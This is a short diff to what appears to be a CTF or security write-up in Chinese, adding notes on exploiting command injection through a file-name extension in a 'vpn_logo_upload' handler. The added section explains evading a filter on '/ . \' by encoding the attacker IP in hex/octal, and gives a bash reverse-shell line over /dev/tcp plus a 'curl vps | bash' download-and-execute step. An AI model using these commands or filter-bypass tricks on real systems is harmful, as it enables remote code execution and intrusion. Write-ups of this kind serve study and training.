@@ -33,3 +33,16 @@ if file_src == "vpn_logo_upload":
 # Refference 
 + [l3m0n:小密圈专题(2)-命令执行绕过](http://www.cnblogs.com/iamstudy/articles/command_exec_tips_1.html)
 
+
+
+# By JrXnm
+
+在后缀名可以命令执行, 因为有os.path.splitext()划分后缀,所以命令中不能含有`/ . \` 
+
+不过可以用远程下载执行,curl 和wget都行.
+
+将IP转成16进制ip(先将点分十进制各个转换成16进制,再合在一起转换成8进制,访问时加0这个前缀.)
+
+在vps上挂好shell,比如  `bash -i >& /dev/tcp/127.0.0.1/6666 0>&1` 然后 curl下载
+
+curl  vps | bash
